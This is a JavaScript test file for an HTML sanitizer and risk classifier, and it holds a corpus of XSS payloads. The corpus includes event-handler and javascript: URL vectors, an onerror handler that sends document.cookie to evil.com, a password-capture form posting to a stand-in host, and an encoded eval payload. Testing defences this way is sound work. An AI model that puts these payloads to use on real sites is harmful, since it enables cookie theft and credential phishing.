/**
 * HTML Security — XSS Corpus Regression Tests
 *
 * Proves:
 * 1. sanitizePreviewHtml strips all dangerous patterns from preview output
 * 2. classifyHtmlRisk correctly tiers known-nasty payloads
 * 3. buildPreviewDocument produces safe HTML (no script execution possible)
 * 4. buildInteractiveDocument strips <base> and <meta refresh>
 * 5. Preview output still renders basic formatting (not nuked)
 */
import { createRequire } from 'node:module'
import { describe, expect, it } from 'vitest'

const require = createRequire(import.meta.url)

const {
  sanitizePreviewHtml,
  buildPreviewDocument,
  buildInteractiveDocument,
} = require('../src/lib/htmlPreviewDocument')

const {
  classifyHtmlRisk,
  detectHtmlFeatures,
  validateHtmlForRuntime,
  RISK_TIER,
} = require('../src/lib/htmlSecurity')

/* ═══════════════════════════════════════════════════════════════════════════
 * 1) sanitizePreviewHtml — XSS corpus (must strip all dangerous patterns)
 * ═══════════════════════════════════════════════════════════════════════════ */
describe('sanitizePreviewHtml — XSS payload stripping', () => {
  // Helper: assert output contains no executable patterns
  function assertSafe(output) {
    expect(output).not.toMatch(/<script[\s>]/i)
    expect(output).not.toMatch(/\bon\w+\s*=/i)
    expect(output).not.toMatch(/javascript\s*:/i)
    expect(output).not.toMatch(/<iframe[\s>]/i)
    expect(output).not.toMatch(/<object[\s>]/i)
    expect(output).not.toMatch(/<embed[\s>]/i)
    expect(output).not.toMatch(/<base[\s>]/i)
    expect(output).not.toMatch(/<meta[\s>]/i)
  }

  it('strips <script>alert("xss")</script>', () => {
    const out = sanitizePreviewHtml('<p>Hello</p><script>alert("xss")</script>')
    assertSafe(out)
    expect(out).toContain('<p>Hello</p>')
  })

  it('strips <img src=x onerror=alert(1)>', () => {
    const out = sanitizePreviewHtml('<img src=x onerror=alert(1)>')
    assertSafe(out)
    // img tag may survive but onerror must be gone
    expect(out).not.toMatch(/onerror/)
  })

  it('strips <svg onload=alert(1)>', () => {
    const out = sanitizePreviewHtml('<svg onload=alert(1)><circle/></svg>')
    assertSafe(out)
    expect(out).not.toMatch(/onload/)
  })

  it('strips <a href="javascript:alert(1)">', () => {
    const out = sanitizePreviewHtml('<a href="javascript:alert(1)">click me</a>')
    assertSafe(out)
    // Link text may survive but href must not be javascript:
    expect(out).not.toMatch(/javascript/)
  })

  it('strips <body onload=alert(1)>', () => {
    const out = sanitizePreviewHtml('<body onload=alert(1)><p>text</p></body>')
    assertSafe(out)
  })

  it('strips <iframe src="evil.com">', () => {
    const out = sanitizePreviewHtml('<p>Before</p><iframe src="https://evil.com"></iframe><p>After</p>')
    assertSafe(out)
    expect(out).toContain('Before')
    expect(out).toContain('After')
  })

  it('strips <object> and <embed>', () => {
    const out = sanitizePreviewHtml('<object data="evil.swf"></object><embed src="evil.swf">')
    assertSafe(out)
  })

  it('strips <math href="javascript:alert(1)">', () => {
    const out = sanitizePreviewHtml('<math href="javascript:alert(1)"><mi>x</mi></math>')
    assertSafe(out)
  })

  it('strips <details ontoggle=alert(1)>', () => {
    const out = sanitizePreviewHtml('<details ontoggle=alert(1)><summary>Click</summary>Content</details>')
    assertSafe(out)
    // details tag allowed, but ontoggle must be stripped
    expect(out).not.toMatch(/ontoggle/)
  })

  it('strips <img src="x" onerror="fetch(\'https://evil.com?c=\'+document.cookie)">', () => {
    const out = sanitizePreviewHtml('<img src="x" onerror="fetch(\'https://evil.com?c=\'+document.cookie)">')
    assertSafe(out)
    expect(out).not.toMatch(/document\.cookie/)
  })

  it('strips <input onfocus=alert(1) autofocus>', () => {
    const out = sanitizePreviewHtml('<input onfocus=alert(1) autofocus>')
    assertSafe(out)
    expect(out).not.toMatch(/onfocus/)
  })

  it('strips <marquee onstart=alert(1)>', () => {
    const out = sanitizePreviewHtml('<marquee onstart=alert(1)>scrolling</marquee>')
    assertSafe(out)
  })

  it('strips <form action="javascript:alert(1)">', () => {
    const out = sanitizePreviewHtml('<form action="javascript:alert(1)"><input></form>')
    assertSafe(out)
  })

  it('strips data:text/html in src', () => {
    const out = sanitizePreviewHtml('<iframe src="data:text/html,<script>alert(1)</script>">')
    assertSafe(out)
  })

  it('strips <svg><foreignObject><body onload=alert(1)>', () => {
    const out = sanitizePreviewHtml('<svg><foreignObject><body onload=alert(1)></body></foreignObject></svg>')
    assertSafe(out)
  })

  it('strips event handler with mixed case (OnError)', () => {
    const out = sanitizePreviewHtml('<img src=x OnError=alert(1)>')
    assertSafe(out)
    expect(out.toLowerCase()).not.toMatch(/onerror/)
  })

  it('strips javascript: with whitespace/encoding tricks', () => {
    const out = sanitizePreviewHtml('<a href="java\tscript:alert(1)">x</a>')
    assertSafe(out)
  })
})

/* ═══════════════════════════════════════════════════════════════════════════
 * 2) Safe output still renders formatting
 * ═══════════════════════════════════════════════════════════════════════════ */
describe('sanitizePreviewHtml — preserves safe formatting', () => {
  it('preserves basic HTML: p, strong, em, ul, li, a(href)', () => {
    const html = '<p><strong>Bold</strong> and <em>italic</em></p><ul><li>Item</li></ul><a href="https://example.com">Link</a>'
    const out = sanitizePreviewHtml(html)
    expect(out).toContain('<strong>Bold</strong>')
    expect(out).toContain('<em>italic</em>')
    expect(out).toContain('<ul>')
    expect(out).toContain('<li>Item</li>')
  })

  it('preserves tables', () => {
    const html = '<table><thead><tr><th>Header</th></tr></thead><tbody><tr><td>Cell</td></tr></tbody></table>'
    const out = sanitizePreviewHtml(html)
    expect(out).toContain('<table>')
    expect(out).toContain('<th>Header</th>')
    expect(out).toContain('<td>Cell</td>')
  })

  it('preserves images with safe src', () => {
    const html = '<img src="data:image/png;base64,abc123" alt="photo">'
    const out = sanitizePreviewHtml(html)
    expect(out).toContain('data:image/png')
    expect(out).toContain('alt="photo"')
  })

  it('preserves inline styles', () => {
    const html = '<div style="color: red; font-size: 16px;">Styled</div>'
    const out = sanitizePreviewHtml(html)
    expect(out).toContain('style=')
    expect(out).toContain('Styled')
  })

  it('preserves semantic HTML (section, article, details)', () => {
    const html = '<section><article><details><summary>FAQ</summary>Answer</details></article></section>'
    const out = sanitizePreviewHtml(html)
    expect(out).toContain('<section>')
    expect(out).toContain('<article>')
    expect(out).toContain('<details>')
    expect(out).toContain('<summary>FAQ</summary>')
  })
})

/* ═══════════════════════════════════════════════════════════════════════════
 * 3) buildPreviewDocument — full document safety
 * ═══════════════════════════════════════════════════════════════════════════ */
describe('buildPreviewDocument — full document safety', () => {
  it('produces valid HTML5 document with sanitized body', () => {
    const doc = buildPreviewDocument({
      title: 'Test Sheet',
      html: '<p>Hello</p><script>alert(1)</script>',
    })
    expect(doc).toContain('<!doctype html>')
    expect(doc).toContain('<title>Test Sheet</title>')
    expect(doc).toContain('<p>Hello</p>')
    expect(doc).not.toMatch(/<script[\s>]/i)
  })

  it('escapes title to prevent injection', () => {
    const doc = buildPreviewDocument({
      title: '</title><script>alert(1)</script>',
      html: '<p>Content</p>',
    })
    expect(doc).not.toMatch(/<script[\s>]/i)
  })
})

/* ═══════════════════════════════════════════════════════════════════════════
 * 4) buildInteractiveDocument — strips base/meta-refresh
 * ═══════════════════════════════════════════════════════════════════════════ */
describe('buildInteractiveDocument — dangerous tag stripping', () => {
  it('strips <base href="...">', () => {
    const doc = buildInteractiveDocument({
      title: 'Test',
      html: '<base href="https://evil.com"><p>Content</p>',
    })
    expect(doc).not.toMatch(/<base[\s>]/i)
    expect(doc).toContain('<p>Content</p>')
  })

  it('strips <meta http-equiv="refresh">', () => {
    const doc = buildInteractiveDocument({
      title: 'Test',
      html: '<meta http-equiv="refresh" content="0;url=https://evil.com"><p>Content</p>',
    })
    expect(doc).not.toMatch(/http-equiv/i)
    expect(doc).toContain('<p>Content</p>')
  })

  it('preserves inline scripts (CSP handles blocking)', () => {
    const doc = buildInteractiveDocument({
      title: 'Test',
      html: '<p>Content</p><script>console.log("interactive")</script>',
    })
    // Interactive mode preserves scripts — CSP is the enforcement layer
    expect(doc).toContain('<script>')
  })
})

/* ═══════════════════════════════════════════════════════════════════════════
 * 5) classifyHtmlRisk — risk tier assignment
 * ═══════════════════════════════════════════════════════════════════════════ */
describe('classifyHtmlRisk — tier assignment', () => {
  it('clean HTML gets TIER 0 (CLEAN)', () => {
    const result = classifyHtmlRisk('<p>Hello <strong>world</strong></p>')
    expect(result.tier).toBe(RISK_TIER.CLEAN)
  })

  it('HTML with <script> gets TIER 1 (FLAGGED)', () => {
    const result = classifyHtmlRisk('<p>Text</p><script>console.log("hi")</script>')
    expect(result.tier).toBeGreaterThanOrEqual(RISK_TIER.FLAGGED)
  })

  it('HTML with inline event handler gets TIER 1+', () => {
    const result = classifyHtmlRisk('<img src=x onerror=alert(1)>')
    expect(result.tier).toBeGreaterThanOrEqual(RISK_TIER.FLAGGED)
  })

  it('HTML with credential capture form gets TIER 3 (QUARANTINED)', () => {
    const result = classifyHtmlRisk(`
      <form action="https://evil.com/steal">
        <input type="password" name="password">
        <input type="submit">
      </form>
    `)
    expect(result.tier).toBe(RISK_TIER.QUARANTINED)
  })

  it('HTML with eval + fetch gets TIER 2+ (HIGH_RISK)', () => {
    const result = classifyHtmlRisk('<script>eval(atob("ZmV0Y2goImh0dHA6Ly9ldmlsLmNvbSIp"))</script>')
    expect(result.tier).toBeGreaterThanOrEqual(RISK_TIER.HIGH_RISK)
  })
})

/* ═══════════════════════════════════════════════════════════════════════════
 * 6) detectHtmlFeatures — finds dangerous patterns
 * ═══════════════════════════════════════════════════════════════════════════ */
describe('detectHtmlFeatures — detection coverage', () => {
  it('detects <script> tags', () => {
    const result = detectHtmlFeatures('<script>alert(1)</script>')
    expect(result.features.length).toBeGreaterThan(0)
  })

  it('detects <iframe> tags', () => {
    const result = detectHtmlFeatures('<iframe src="evil.com"></iframe>')
    expect(result.features.length).toBeGreaterThan(0)
  })

  it('detects inline event handlers', () => {
    const result = detectHtmlFeatures('<div onclick="alert(1)">click</div>')
    expect(result.features.length).toBeGreaterThan(0)
  })

  it('detects javascript: URLs', () => {
    const result = detectHtmlFeatures('<a href="javascript:alert(1)">x</a>')
    expect(result.features.length).toBeGreaterThan(0)
  })

  it('returns empty for clean HTML', () => {
    const result = detectHtmlFeatures('<p>Hello <strong>world</strong></p>')
    expect(result.features.length).toBe(0)
  })
})

/* ═══════════════════════════════════════════════════════════════════════════
 * 7) validateHtmlForRuntime — blocks external resources
 * ═══════════════════════════════════════════════════════════════════════════ */
describe('validateHtmlForRuntime — external resource blocking', () => {
  it('rejects <script src="...">', () => {
    const result = validateHtmlForRuntime('<script src="https://evil.com/xss.js"></script>')
    expect(result.ok).toBe(false)
  })

  it('rejects <base> tag', () => {
    const result = validateHtmlForRuntime('<base href="https://evil.com">')
    expect(result.ok).toBe(false)
  })

  it('rejects <meta http-equiv="refresh">', () => {
    const result = validateHtmlForRuntime('<meta http-equiv="refresh" content="0;url=https://evil.com">')
    expect(result.ok).toBe(false)
  })

  it('rejects remote src URLs', () => {
    const result = validateHtmlForRuntime('<img src="https://tracker.evil.com/pixel.gif">')
    expect(result.ok).toBe(false)
  })

  it('allows inline script (no src)', () => {
    const result = validateHtmlForRuntime('<script>console.log("safe")</script>')
    expect(result.ok).toBe(true)
  })

  it('allows data: URLs', () => {
    const result = validateHtmlForRuntime('<img src="data:image/png;base64,abc123">')
    expect(result.ok).toBe(true)
  })
})
